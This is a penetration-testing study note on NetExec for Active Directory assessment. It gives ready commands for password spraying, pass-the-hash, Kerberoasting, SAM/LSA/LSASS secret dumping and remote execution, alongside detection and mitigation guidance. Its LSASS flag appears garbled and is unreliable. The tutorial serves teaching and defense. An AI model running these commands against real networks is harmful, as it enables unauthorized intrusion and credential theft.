---
tags: [active-directory, basics, enumeration, vapt]
difficulty: beginner
module: "67 - AD Enumeration and Tooling Basics"
topic: "67.04 NetExec CrackMapExec Basics"
---

# 67.04 NetExec CrackMapExec Basics and Module Usage

## 1. Introduction to NetExec

NetExec (the spiritual, heavily updated, and functionally superior successor to CrackMapExec, or CME) is widely considered the "Swiss Army knife" for penetration testing and red teaming within Active Directory environments. It is a highly concurrent, post-exploitation tool designed to automate the assessment of security across large AD networks.

Developed in Python and heavily leveraging the `Impacket` library alongside native Windows APIs, NetExec interacts seamlessly with core network protocols like SMB, WMI, LDAP, MSSQL, WinRM, and RDP. NetExec empowers attackers to rapidly spray credentials, execute code remotely, dump sensitive secrets, and enumerate AD data efficiently across thousands of hosts simultaneously.

### 1.1 Why NetExec is Essential
- **Massive Concurrency**: It utilizes threading to target entire subnets (`/24` or even `/16`) incredibly fast, processing authentications in parallel.
- **Living off the Land (LotL)**: It abuses built-in administrative protocols and features (SMB, WMI, WinRM) rather than exploiting memory corruption vulnerabilities, making it highly reliable and less likely to crash systems.
- **Extensive Modularity**: It contains hundreds of built-in, community-developed modules for highly specific tasks (e.g., finding exposed LAPS passwords, enumerating WebDav, checking for Spooler services, validating PetitPotam).
- **Stealth and OPSEC**: While it can be exceptionally noisy if misused, it interacts with standard APIs. When used carefully, basic enumeration blends in with normal administrative traffic.

## 2. Architecture and Protocol Interaction

```text
+-------------------+      Protocols       +-----------------------+
|                   +------ SMB (445) ----->                       |
|   Attacker /      |                      |   Target Workstation  |
|   NetExec Core    +------ WMI (135) ----->   or Domain Controller|
|                   |                      |                       |
|  +-------------+  +------ WinRM (5985) -->  +-----------------+  |
|  |             |  |                      |  |                 |  |
|  |  Modules    +------ LDAP (389) -----> |  | Active Directory|  |
|  |             |  |                      |  | Services / Local|  |
|  +-------------+  +------ MSSQL (1433) -->  | SAM Database    |  |
|                   |                      |  +-----------------+  |
+-------------------+                      +-----------------------+
```

NetExec treats the initial target specification as a protocol binding. The syntax universally follows this structure:
`nxc <protocol> <target_IP_or_Subnet> -u <username> -p <password> [options] [-M module]`

## 3. Core Capabilities and Practical Usage

### 3.1 Null Session and Anonymous Enumeration
Before obtaining any valid credentials, operators can check if hosts allow anonymous or null access, which is often a critical misconfiguration.
```bash
# Check for null session access over SMB across a subnet
nxc smb 192.168.1.0/24 -u '' -p ''

# Enumerate shares anonymously on a specific target
nxc smb 192.168.1.10 -u '' -p '' --shares

# Check for anonymous LDAP binds against a Domain Controller
nxc ldap dc01.target.local -u '' -p ''
```

### 3.2 Credential Spraying and Validation
Once a valid user (or a list of potential users) is acquired, NetExec can validate those credentials across the entire network or execute password spraying.
```bash
# Validate a single credential pair across a subnet
nxc smb 192.168.1.0/24 -u 'jdoe' -p 'Password123!'

# Password spraying (Testing one password against a list of users)
nxc smb dc01.target.local -u users.txt -p 'Winter2024!' --continue-on-success

# Pass-the-Hash (PTH) authentication using an NTLM hash
nxc smb 192.168.1.0/24 -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
```
*Crucial Indicator: NetExec will output a green `Pwn3d!` tag when the provided credentials or hashes possess Local Administrator access on the target machine.*

### 3.3 Active Directory Enumeration (LDAP)
NetExec acts as a highly efficient LDAP client, capable of dumping users, groups, and identifying severe AD vulnerabilities without requiring Windows RSAT tools.
```bash
# Dump all AD users and their core properties
nxc ldap dc01.target.local -u 'jdoe' -p 'Pass123' --users

# Automatically query and dump Kerberoastable users and their hashes
nxc ldap dc01.target.local -u 'jdoe' -p 'Pass123' --kerberoasting output.txt

# Automatically query and dump AS-REP Roastable users
nxc ldap dc01.target.local -u 'jdoe' -p 'Pass123' --asreproast output.txt
```

### 3.4 Post-Exploitation and Secret Dumping
If an operator achieves Local Administrator rights (`Pwn3d!`), NetExec can automate the dumping of credentials using remote execution protocols.
```bash
# Dump local SAM hashes from the registry
nxc smb target_ip -u 'admin' -p 'pass' --sam

# Dump LSA secrets (often contains plaintext passwords or service accounts)
nxc smb target_ip -u 'admin' -p 'pass' --lsa

# Dump LSASS memory for plaintext credentials (Highly invasive, triggers AV/EDR)
nxc smb target_ip -u 'admin' -p 'pass' --lsassi
```

## 4. Utilizing NetExec Modules

NetExec's true power lies in its extensible modules, designed to perform specific checks, abuse misconfigurations, or exploit known vulnerabilities. You can list all available modules with: `nxc smb -L`

### 4.1 Notable and High-Impact Modules
- **`laps`**: Checks if LAPS (Local Administrator Password Solution) passwords are electronically readable by the provided user context.
  `nxc ldap dc01 -u user -p pass -M laps`
- **`gpp_password`**: Scours SYSVOL for legacy Group Policy Preferences passwords (cpassword) that can be easily decrypted using a known Microsoft private key.
  `nxc smb dc01 -u user -p pass -M gpp_password`
- **`petitpotam` / `zerologon` / `nopac`**: Scans domain controllers for specific, high-criticality AD vulnerabilities that allow immediate domain takeover.
  `nxc smb dc01 -u user -p pass -M petitpotam`
- **`slinky`**: Creates malicious LNK files on writable network file shares to capture NTLMv2 hashes when users browse the share.

## 5. Remote Code Execution Contexts: WMI vs WinRM vs SMB

When NetExec is instructed to execute commands (e.g., using the `-x` flag for `cmd.exe` commands or `-X` for PowerShell), it must choose an underlying execution method. Understanding these is vital for evasion.
- **SMB/RPC (`atexec`/`smbexec`)**: Creates a temporary Windows service, executes the command, and deletes the service. Highly noisy, heavily signatured, and almost always blocked by modern EDR.
- **WMI (`wmiexec`)**: Uses Windows Management Instrumentation. Quieter than `smbexec` but still heavily monitored. It does not drop a service but uses specific named pipes.
- **WinRM**: Uses standard PowerShell Remoting. Blends in exceptionally well with normal administrative traffic, making it the preferred method if port 5985 is open.

```bash
# Execute a command via WMI (Default for SMB protocol if not specified)
nxc smb target_ip -u 'admin' -p 'pass' -x 'ipconfig' --exec-method wmiexec

# Execute a command via WinRM (Highly stealthy)
nxc winrm target_ip -u 'admin' -p 'pass' -x 'whoami'
```

## 6. Defensive Perspectives and Detection

### 6.1 Telemetry and Signatures
- **Authentication Logs**: Massive, sudden spikes in Event ID 4624 (Successful Logon) and 4625 (Failed Logon) originating from a single IP address strongly indicate password spraying or validation via NetExec.
- **Service Creation**: The `smbexec` behavior immediately triggers Event ID 7045 (A service was installed in the system) with randomly generated, highly suspicious alphanumeric service names.
- **Named Pipes**: NetExec utilizes specific, predictable named pipes for WMI execution output reading, which can be easily signatured by network sensors.
- **Network Traffic**: A single host initiating SMB connections to hundreds of devices in seconds is a classic signature of NetExec scanning.

### 6.2 Mitigation Strategies
- **Enforce Kerberos / Disable NTLM**: Transition to Kerberos-only authentication where possible to definitively prevent Pass-the-Hash attacks.
- **Implement LAPS**: Utilize the Local Administrator Password Solution to randomize local admin passwords across the fleet, preventing lateral movement even if local SAM hashes are dumped.
- **Network Segmentation**: Workstations should inherently not be able to communicate with each other over SMB (Port 445). Only Domain Controllers and designated File Servers should accept inbound SMB connections from standard workstations.

## Real-World Attack Scenario

An attacker extracts a plaintext password for a standard service account from an unsecured internal wiki. To maximize the impact of this credential, they use NetExec to perform a targeted password spray across the entire `/24` server subnet via the SMB protocol (`nxc smb 10.0.0.0/24 -u 'svc_backup' -p 'P@ssw0rd1'`). NetExec concurrently tests the credential and immediately flags a `Pwn3d!` tag on a legacy application server, indicating the service account improperly retains Local Administrator rights. The attacker seamlessly pivots, instructing NetExec to use its `--lsa` module on that specific server to dump LSA secrets, recovering a high-privileged Domain Admin credential stored in memory.

## Chaining Opportunities
- Utilize the active host lists generated from [[03 - Ping Sweeping and Host Discovery in AD]] as the specific target files for NetExec to optimize scanning speed and reduce noise.
- Identify local administrative access (`Pwn3d!`) and use those validated credentials to execute **BloodHound** ingestors or pull secrets to elevate privileges further. See [[01 - Introduction to BloodHound and SharpHound]].
- Cross-reference LDAP enumeration data obtained via NetExec with manual techniques outlined in [[05 - Enumerating Users and Groups via LDAP]].

## Related Notes
- [[01 - Introduction to BloodHound and SharpHound]]
- [[02 - Using PowerView for AD Enumeration]]
- [[03 - Ping Sweeping and Host Discovery in AD]]
- [[05 - Enumerating Users and Groups via LDAP]]

## Advanced Threat Hunting and Behavioral Analytics

As evasion techniques evolve, reliance on static indicators of compromise (IoCs) is insufficient. Defenders must pivot to behavioral analytics.

### Baseline Deviation Analysis
Instead of hunting for specific tool signatures (like `SharpHound.exe` or `PowerView.ps1`), mature SOCs establish baselines of administrative behavior.
1. **Administrative Logon Baselines**: Identify the standard jump boxes and IP ranges used by authorized administrators. Any high-privileged authentication originating from a non-standard workstation (e.g., a receptionist's PC) triggers an immediate severity-high alert, regardless of the tool used.
2. **Protocol Baselines**: Standard users rarely, if ever, initiate raw RPC or WMI connections to other workstations. Detecting a high volume of lateral SMB/RPC traffic originating from a standard subnet is a strong behavioral indicator of enumeration or lateral movement.

### Leveraging Graph Databases for Defense
Defenders can utilize the exact same graph theory concepts employed by attackers to secure the environment proactively.
- **Continuous Ingestion**: By scheduling daily or weekly automated ingestions of AD data into a defensive Neo4j database, defenders can track changes over time.
- **Chokepoint Identification**: Graph analysis reveals "chokepoints"—specific users or groups that serve as critical bridges in numerous attack paths. Removing privileges from these chokepoint accounts fractures the attack graph, significantly increasing the effort required by an attacker.
- **Unintended Permission Auditing**: Graph databases easily highlight misconfigurations such as standard users accidentally granted `GenericAll` rights over critical infrastructure OUs due to complex, nested group memberships.

### Conclusion
Active Directory enumeration is a delicate balance of noise versus insight. Attackers must constantly adapt to increasingly sophisticated telemetry and detection mechanisms. For defenders, understanding the mechanics of these enumeration tools is paramount. Security is no longer just about preventing the initial compromise; it is about anticipating the attacker's post-exploitation reconnaissance and disrupting their ability to discover the pathways to domain dominance.

### Real-World Incident Response Scenarios
When responding to suspected AD enumeration:
1. **Isolate Suspect Endpoints**: Immediately quarantine the endpoint initiating the anomalous LDAP or RPC queries.
2. **Review TGT Requests**: Correlate the endpoint activity with Event ID 4768 (A Kerberos authentication ticket (TGT) was requested) to identify the compromised account.
3. **Analyze BloodHound Execution**: If SharpHound is suspected, search for Event ID 4688 containing command-line arguments like `--CollectionMethod` or `--Loop`.
4. **Implement Tiered Administration**: If widespread enumeration is detected, immediately restrict Tier-0 accounts from authenticating to lower-tier systems to break potential `HasSession` escalation paths.

## Glossary of Advanced Terms
- **TGT (Ticket Granting Ticket)**: The primary Kerberos ticket used to request access to other services.
- **SPN (Service Principal Name)**: A unique identifier for a service instance, used in Kerberos authentication.
- **ACL (Access Control List)**: A list of permissions attached to an object.
- **DCSync**: An attack technique simulating a Domain Controller to request password hashes via the Directory Replication Service (DRS) Remote Protocol.
- **Pass-the-Hash (PtH)**: Authenticating to a remote system using the underlying NTLM hash of a user's password, rather than the plaintext password itself.
